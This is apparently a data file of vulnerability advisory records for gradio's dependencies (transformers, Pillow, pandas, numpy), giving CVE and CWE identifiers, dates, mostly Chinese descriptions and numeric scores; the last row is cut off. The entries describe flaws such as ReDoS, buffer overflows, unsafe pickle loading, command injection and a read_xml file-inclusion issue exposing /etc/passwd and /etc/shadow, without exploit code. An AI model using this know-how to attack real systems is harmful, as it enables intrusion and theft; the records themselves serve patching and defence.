gradio-app_gradio,transformers,>=4.43.0,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,>=4.43.0,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,>=4.43.0,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,>=4.43.0,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,>=4.43.0,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,>=4.43.0,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,>=4.43.0,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
gradio-app_gradio,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
gradio-app_gradio,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
gradio-app_gradio,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
gradio-app_gradio,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
